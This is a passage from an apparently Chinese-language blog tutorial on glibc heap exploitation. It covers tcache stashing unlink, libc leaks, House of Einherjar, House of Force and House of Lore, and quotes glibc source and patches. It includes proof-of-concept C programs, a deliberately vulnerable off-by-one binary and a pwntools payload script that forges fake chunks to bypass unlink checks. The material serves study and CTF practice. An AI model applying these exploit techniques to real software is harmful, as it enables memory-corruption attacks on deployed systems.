bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">//&gt;0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，当调用<code>calloc</code>函数分配堆块时，不从 tcache bin 中选取，而是从small bin选取，在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。</p>
<h5 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h5><p>当前small bin有两个chunk(chunk0与chunk1)，利用溢出或覆写改掉chunk1的bk位一个可写入的地址writable_addr，</p>
<p>tcache中有5个chunk，当下一次calloc申请chunk时，会返回chunk0给用户，同时将chunk1以及chunk1的bk指针指向的位置作为chunk2放入tcache(因为放入时只检查了第一个chunk，就是chunk1，而没有全部检查)，形成下面的单链表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk2(writable_addr)-&gt;chunk1-&gt;chunk(5)</span><br></pre></td></tr></table></figure>

<p>在这个过程中，因为会出现chunk1从smallbin的脱链操作，所以会把chunk2的fd设置为bin的地址，即写入了一个libc地址。</p>
<p>随后再次malloc，可以申请到这个伪造的chunk2。</p>
<h4 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h4><p>这个和tcache有那么点关系，主要是之前可以直接malloc一个chunk，然后通过free后的fd位置得到libc中unsorted bin的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>在glibc2.26后由于出现了tcache，所以需要填满tcache再leak：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>* t[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> *a=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">long</span> *b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        t[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(t[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="comment">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h4 id="Tcache-Check"><a href="#Tcache-Check" class="headerlink" title="Tcache Check"></a>Tcache Check</h4><p> Tcache 的 double free 的 check：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*找对应到tcache的index*/</span></span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">  <span class="comment">/*遍历链表看是不是有相同的tcache chunk 防止double free*/</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<p>这个其实前面已经说过了，这会导致tcache dup失效。</p>
<p>不过这个只是在tcache chunk的free了判断，而不是tcache_get或tcache_put,这两个用来从tcache存取chunk的函数还是原来那样简单，或许有其他可利用的地方。</p>
<h3 id="House-Of-Einherjar-glibc-2-28及以下可用"><a href="#House-Of-Einherjar-glibc-2-28及以下可用" class="headerlink" title="House Of Einherjar(glibc 2.28及以下可用)"></a>House Of Einherjar(glibc 2.28及以下可用)</h3><p>原理就是利用了free中早期未对后向合并过程做检查。下面是早期的free过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* consolidate backward *&#x2F;</span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize &#x3D; prev_size(p);</span><br><span class="line">    size +&#x3D; prevsize;</span><br><span class="line">    p &#x3D; chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在进行后向合并时，会根据当前块的prev_size和prev_inuse去获取相邻低地址处chunk。</p>
<ul>
<li><p>由前面的堆管理可以知道，chunk的prev_size是和前一个chunk共享的，低地址的chunk在使用中可以使用到高地址chunk的prev_size字段，因此可以用过写低地址的chunk修改高地址chunk的prev_size，如果有off_by_one漏洞则可以覆盖高地址chunk的prev_inuse位，将低地址chunk标记为空闲。</p>
</li>
<li><p>在free时高地址chunk时便会通过prev_inuse发现低地址chunk是空闲，尝试通过prev_size去找到这个低地址chunk的头部进行unlink后合并。</p>
</li>
<li><p>由于会对新的chunk进行unlink，所以需要确保对应 chunk 位置构造好了 fake chunk 以便于绕过 unlink 的检测如下：只需要将p-&gt;fk和p-&gt;bk均设为p即可,并且需要伪造一个next chunk的prev_size。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                      \</span><br><span class="line">	malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="line">...</span><br><span class="line">if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))      \</span><br><span class="line">	malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br></pre></td></tr></table></figure>

<p>可以参考例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* s0 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);　<span class="comment">//构造fake chunk</span></span><br><span class="line">    <span class="keyword">char</span>* s1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">char</span>* s2 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);　</span><br><span class="line">    <span class="keyword">char</span>* s3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">//为了不让s2与top chunk 合并</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, s0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s0\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s0, <span class="number">0x200</span>); <span class="comment">//读入fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s1\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s1, <span class="number">0x19</span>); <span class="comment">//Off By One</span></span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./example&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;begin\n&quot;</span>)</span><br><span class="line">address = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s0\n&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(address) * <span class="number">2</span> + <span class="string">&quot;A&quot;</span>*<span class="number">0xe0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p64(address) * 2是为了绕过</span></span><br><span class="line"><span class="string">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span></span><br><span class="line"><span class="string">  malloc_printerr (&quot;corrupted double-linked list&quot;);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) <span class="comment">#next fake chunk prev_size</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">绕过检查：</span></span><br><span class="line"><span class="string">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="string">	malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s1\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x220</span>) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>



<h4 id="patch-1"><a href="#patch-1" class="headerlink" title="patch"></a>patch</h4><p>glibc 2.29后失效，添加了安全检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="comment">/*后向合并  合并的是比他地址低的chunk*/</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li>glibc&lt;=2.28</li>
<li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li>
<li>需要泄漏地址,计算目的 chunk 与 p1 地址之间的差</li>
<li>需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>
</ul>
<h3 id="House-Of-Force-glibc2-28及以下"><a href="#House-Of-Force-glibc2-28及以下" class="headerlink" title="House Of Force( glibc2.28及以下)"></a>House Of Force( glibc2.28及以下)</h3><p>对top chunk做文章。通过修改top chunk 的size 绕过top chunk大小判断，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;<span class="comment">/*获取当前top chunk位置*/</span></span><br><span class="line">size = chunksize (victim);<span class="comment">/*获取top chunk大小*/</span></span><br><span class="line"><span class="comment">/*如果top chunk大小分配完还够一个最小chunk  就分配*/</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*剩余大小*/</span></span><br><span class="line">	remainder_size = size - nb;</span><br><span class="line">    <span class="comment">/*剩余chunk*/</span></span><br><span class="line">	remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    <span class="comment">/*修改top chunk指针*/</span></span><br><span class="line">	av-&gt;top = remainder;</span><br><span class="line">	set_head (victim, nb | PREV_INUSE |</span><br><span class="line">	(av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">	set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">	check_malloced_chunk (av, victim, nb);</span><br><span class="line">	<span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里在检查size的时候出现了问题，使用的是无符号数。</p>
<p>一般的做法是把 top chunk 的 size 改为 - 1，这样在比较时size 转换成无符号数通过验证。并且这时在计算新的top chunk时由于是用了size-nb，而nb可以为负数，导致top chunk向低地址处移动。</p>
<p>而在malloc(size)的过程中，malloc调用了宏checked_request2size去检查size：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (req) &gt;=						      \</span><br><span class="line">   (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (INTERNAL_SIZE_T) (<span class="number">-2</span> * MINSIZE))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="line">        __set_errno(ENOMEM);                                                   \</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;                                                              \</span><br><span class="line">    &#125;                                                                          \</span><br><span class="line">    (sz) = request2size(req);</span><br><span class="line"></span><br><span class="line">checked_request2size (bytes, nb)</span><br></pre></td></tr></table></figure>

<p>总结malloc(size)时size有以下几个限制：</p>
<ul>
<li>传递的参数不得大于 -2 * MINSIZE</li>
<li>需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为需要大小。<ul>
<li>这里需要注意对齐与否，如果对齐直接减去SIZE_SZ 和MALLOC_ALIGN_MASK即可</li>
</ul>
</li>
<li>可以通过申请负的size将top chunk降低到低地址空间修改got表等地址处的值</li>
<li>也可以通过申请很大的size将top chunk抬高到高地址空间修改其他地址处的值</li>
</ul>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。</li>
<li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li>
<li>第三，分配的次数不能受限制</li>
</ul>
<p>其中第二点一般ctf无法满足</p>
<h4 id="patch-2"><a href="#patch-2" class="headerlink" title="patch"></a>patch</h4><p>glibc2.29加入了判定，方法失效。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="House-of-Lore-全版本可用"><a href="#House-of-Lore-全版本可用" class="headerlink" title="House of Lore(全版本可用?)"></a>House of Lore(全版本可用?)</h3><p>对small bin做文章。这个是<code>_int_malloc</code>在申请堆块位于small bin时的流程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">   hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">   (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">   processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">   anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">        <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">            malloc_consolidate(av);</span><br><span class="line">        <span class="comment">// 